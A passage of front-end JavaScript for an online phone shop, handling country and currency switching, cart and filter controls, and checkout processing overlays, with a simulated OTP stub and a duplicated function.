                return priceA - priceB;
            case 'price-high-low':
                return priceB - priceA;
            case 'featured':
            default:
                return 0;
        }
    });

    products.forEach(product => productsContainer.appendChild(product));
}

// Prevent multiple initializations
let scriptInitialized = false;

// Initialize page functionality
document.addEventListener('DOMContentLoaded', function() {
    if (scriptInitialized) {
        return;
    }

    // Scroll to top of page immediately
    window.scrollTo(0, 0);
    document.documentElement.scrollTop = 0;
    document.body.scrollTop = 0;

    scriptInitialized = true;

    try {
        // Set initial country display
        const currentFlag = document.getElementById('current-flag');
        const currentCountryEl = document.getElementById('current-country');
        const initialConfig = countryConfig[currentCountry];

        if (initialConfig && currentFlag && currentCountryEl) {
            currentFlag.textContent = initialConfig.flag;
            currentCountryEl.textContent = initialConfig.name;
            currentLanguage = initialConfig.lang;
            updateLanguage(currentLanguage);
        }

        // Initialize cart
        updateCartUI();

        // Initialize checkout
        try {
            initializeCheckout();
        } catch (error) {
            console.error('Error initializing checkout:', error);
        }

        // Update prices
        updatePrices();

        // Country dropdown functionality
        const countryDropdownBtn = document.getElementById('country-dropdown-btn');
        const countryDropdown = document.getElementById('country-dropdown');

        if (countryDropdownBtn && countryDropdown) {
            countryDropdownBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                countryDropdown.classList.toggle('hidden');
            });

            document.addEventListener('click', function(e) {
                if (!countryDropdownBtn.contains(e.target) && !countryDropdown.contains(e.target)) {
                    countryDropdown.classList.add('hidden');
                }
            });

            // Country selection
            const countryOptions = document.querySelectorAll('.country-option');
            countryOptions.forEach(option => {
                option.addEventListener('click', function(e) {
                    e.preventDefault();
                    const country = this.getAttribute('data-country');
                    const config = countryConfig[country];

                    if (config) {
                        currentCountry = country;
                        currentLanguage = config.lang;
                        const currentFlag = document.getElementById('current-flag');
                        const currentCountryEl = document.getElementById('current-country');

                        if (currentFlag) currentFlag.textContent = config.flag;
                        if (currentCountryEl) currentCountryEl.textContent = config.name;

                        // Save to localStorage immediately
                        localStorage.setItem('selectedCountry', country);
                        localStorage.setItem('selectedLanguage', currentLanguage);

                        // Update language and all prices throughout the page
                        updateLanguage(currentLanguage);

                        // Force refresh all product prices with new currency
                        document.querySelectorAll('.current-price').forEach(priceElement => {
                            const usdPrice = parseFloat(priceElement.getAttribute('data-usd-price'));
                            if (!isNaN(usdPrice)) {
                                priceElement.textContent = convertPrice(usdPrice, false);
                            } else {
                                // Extract USD price from text and store it
                                const priceText = priceElement.textContent;
                                const usdMatch = priceText.match(/Starting from \$(\d+(?:\.\d{2})?)/);
                                if (usdMatch) {
                                    const price = parseFloat(usdMatch[1]);
                                    priceElement.setAttribute('data-usd-price', price);
                                    priceElement.textContent = `Starting from ${convertPrice(price, false)}`;
                                }
                            }
                        });

                        updatePrices();
                        updateCartDisplay(); // Refresh cart prices with new currency
                        updateFooterInfo(); // Update footer contact info

                        // Force refresh of any open checkout modal prices
                        const checkoutOverlay = document.getElementById('checkout-overlay');
                        if (checkoutOverlay && checkoutOverlay.classList.contains('active')) {
                            // Refresh checkout totals
                            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
                            const checkoutSubtotal = document.getElementById('checkout-subtotal');
                            const checkoutTotal = document.getElementById('checkout-total');
                            if (checkoutSubtotal) checkoutSubtotal.textContent = convertPrice(subtotal, false);
                            if (checkoutTotal) checkoutTotal.textContent = convertPrice(subtotal, false);
                        }

                        countryDropdown.classList.add('hidden');
                    }
                });
            });
        }

        // Cart functionality with enhanced event handling
        const cartButton = document.getElementById('cart-button');
        const cartOverlay = document.getElementById('cart-overlay');
        const closeCartButton = document.getElementById('close-cart');
        const continueShoppingButton = document.getElementById('continue-shopping');

        if (cartButton && cartOverlay) {
            cartButton.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                cartOverlay.classList.add('active');
                document.body.style.overflow = 'hidden';
                return false;
            });
        }

        if (closeCartButton) {
            closeCartButton.addEventListener('click', function() {
                cartOverlay.classList.remove('active');
                document.body.style.overflow = '';
            });
        }

        if (continueShoppingButton) {
            continueShoppingButton.addEventListener('click', function() {
                cartOverlay.classList.remove('active');
                document.body.style.overflow = '';
            });
        }

        if (cartOverlay) {
            cartOverlay.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.classList.remove('active');
                    document.body.style.overflow = '';
                }
            });
        }

        // Add to cart event listeners with improved error handling
        document.addEventListener('click', function(e) {
            if (e.target.matches('.add-to-cart-btn') || e.target.closest('.add-to-cart-btn')) {
                e.preventDefault();
                e.stopPropagation();

                try {
                    const btn = e.target.matches('.add-to-cart-btn') ? e.target : e.target.closest('.add-to-cart-btn');
                    const productDataAttr = btn.getAttribute('data-product');
                    if (productDataAttr) {
                        const productData = JSON.parse(productDataAttr);
                        addToCart(productData);
                    } else {
                        console.error('No product data found on button');
                    }
                } catch (error) {
                    console.error('Error parsing product data:', error);
                }
                return false;
            }
        });

        // Prevent any form submissions that might cause page reload
        document.addEventListener('submit', function(e) {
            // Only prevent forms within checkout modal
            if (e.target.closest('.checkout-modal')) {
                e.preventDefault();
                return false;
            }
        });

        // Category filter buttons
        document.addEventListener('click', function(e) {
            if (e.target.matches('.filter-btn')) {
                e.preventDefault();
                try {
                    document.querySelectorAll('.filter-btn').forEach(btn => btn.classList.remove('active'));
                    e.target.classList.add('active');
                    const category = e.target.getAttribute('data-filter');
                    if (category) {
                        filterProducts(category);
                    }
                } catch (error) {
                    console.error('Error handling filter click:', error);
                }
            }
        });

        // Sort buttons
        document.addEventListener('click', function(e) {
            if (e.target.matches('.sort-btn')) {
                e.preventDefault();
                try {
                    document.querySelectorAll('.sort-btn').forEach(btn => btn.classList.remove('active'));
                    e.target.classList.add('active');
                    const sortBy = e.target.getAttribute('data-sort');
                    if (sortBy) {
                        sortProducts(sortBy);
                    }
                } catch (error) {
                    console.error('Error handling sort click:', error);
                }
            }
        });

        // Initialize color selections for products
        initializeColorSelection('iphone15promax', 'iphone15promax-color', 'iphone15promax-image', 'add-to-cart-iphone15promax');
        initializeColorSelection('iphone16promax', 'iphone16promax-color', 'iphone16promax-image', 'add-to-cart-iphone16promax');

	 // Add checkout button listener with null check
        const checkoutBtn = document.getElementById('checkout-btn');
        if (checkoutBtn) {
            checkoutBtn.addEventListener('click', function() {
                if (cart.length === 0) {
                    alert(currentLanguage === 'es' ? 'Tu carrito está vacío' : 'Your cart is empty');
                    return;
                }

                createCheckoutModal();
            });
        }

        // Remove duplicate event listeners that cause null errors
        const confirmBankTransferBtn = document.getElementById('confirm-bank-transfer');
        const processOrderBtn = document.getElementById('process-order');
        
        // These buttons don't exist on page load, they're created dynamically in checkout
        // So we don't need to add listeners here

    } catch (error) {
        console.error('Error during script initialization:', error);
    }
});

function updateCartUI() {
    updateCartCount();
    updateCartDisplay();
}

// Utility functions for cart management
function getCartSubtotal() {
    return cart.reduce(function(sum, item) {
        return sum + (item.price * item.quantity);
    }, 0);
}

function formatCurrency(amount) {
    return convertPrice(amount, false);
}

// Initialize all functionality when page loads
function initializePage() {
    try {
        updateCartUI();
        updatePrices();
        updateLanguage(currentLanguage);
    } catch (error) {
        console.error('Error initializing page:', error);
    }
}

// Cleanup function
function cleanup() {
    // Remove any event listeners if needed
    const overlay = document.getElementById('checkout-overlay');
    if (overlay) {
        overlay.remove();
    }
}

// Error handling utility
function handleError(error, context) {
    console.error('Error in ' + context + ':', error);
    if (typeof error === 'object' && error.message) {
        console.error('Error message:', error.message);
    }
}

// Simulate OTP sending for demonstration
function sendOTPToUser(customerName, customerPhone) {
    console.log('Simulating OTP sending...');
    // In a real implementation, this would send an actual OTP
}

// Initialize on page load
if (typeof window !== 'undefined') {
    window.addEventListener('load', function() {
        // Scroll to top of page
        window.scrollTo({
            top: 0,
            left: 0,
            behavior: 'auto'
        });
        document.body.classList.add('page-load-scroll-top');

        // Initialize page
        initializePage();

        // Remove scroll class after animation
        setTimeout(() => {
            document.body.classList.remove('page-load-scroll-top');
        }, 200);
    });
}

// Additional functions
function updateFooterInfo() {
    const phoneElement = document.querySelector('.contact-phone');
    if (phoneElement) {
        phoneElement.textContent = countryConfig[currentCountry].phone;
    }
}

let currentOrderRef = '';

function generateOrderReference() {
    currentOrderRef = `ORDER-${Date.now()}`;
    return currentOrderRef;
}

function getCartTotal() {
    return cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
}

// Function to show notification messages
function showNotification(message, type = 'success') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    document.body.appendChild(notification);

    // Remove the notification after a few seconds
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

function showProcessingState() {
    const bankTransferDetails = document.getElementById('bank-transfer-details');
    const processingOverlay = document.createElement('div');
    processingOverlay.className = 'processing-overlay';
    processingOverlay.innerHTML = `
        <div class="spinner"></div>
        <p>${currentLanguage === 'es' ? 'Procesando su pago...' : 'Processing your payment...'}</p>
    `;

    // Append the overlay directly to the body
    document.body.appendChild(processingOverlay);

    // Optionally, you might want to disable the confirm button:
    const confirmButton = document.getElementById('confirm-bank-transfer');
    if (confirmButton) {
        confirmButton.disabled = true;
    }
}

function showOrderConfirmation() {
    // Hide processing state
    const processingOverlay = document.querySelector('.processing-overlay');
    if (processingOverlay) {
        processingOverlay.remove();
    }

    // Re-enable the confirm button:
    const confirmButton = document.getElementById('confirm-bank-transfer');
    if (confirmButton) {
        confirmButton.disabled = false;
    }

    // Show confirmation message
    alert(currentLanguage === 'es' ? '¡Pago confirmado! Gracias por su compra.' : 'Payment confirmed! Thank you for your purchase.');

    // Clear cart
    clearCart();

    // Close checkout modal
    closeCheckout();
}

function showCardProcessingState() {
    const creditCardDetails = document.getElementById('credit-card-details');
    const processingOverlay = document.createElement('div');
    processingOverlay.className = 'processing-overlay';
    processingOverlay.innerHTML = `
        <div class="spinner"></div>
        <p>${currentLanguage === 'es' ? 'Procesando su pago...' : 'Processing your payment...'}</p>
    `;

    // Append the overlay directly to the body
    document.body.appendChild(processingOverlay);

    // Optionally, you might want to disable the confirm button:
    const confirmButton = document.getElementById('process-order');
    if (confirmButton) {
        confirmButton.disabled = true;
    }
}
 // Removed duplicate place-order event listeners - they're already handled in setupCheckoutEventListeners()

// Remove duplicate event listeners - these are handled in setupCheckoutEventListeners()
// which is called when the checkout modal is created dynamically
	 function showCardProcessingState() {
    const creditCardDetails = document.getElementById('credit-card-details');
    const processingOverlay = document.createElement('div');
    processingOverlay.className = 'processing-overlay';
    processingOverlay.innerHTML = `
        <div class="spinner"></div>
        <p>${currentLanguage === 'es' ? 'Procesando su pago...' : 'Processing your payment...'}</p>
    `;

    // Append the overlay directly to the body
    document.body.appendChild(processingOverlay);

    // Optionally, you might want to disable the confirm button:
    const confirmButton = document.getElementById('process-order');
    if (confirmButton) {
        confirmButton.disabled = true;
    }
}

 // These event listeners are already handled in setupCheckoutEventListeners()
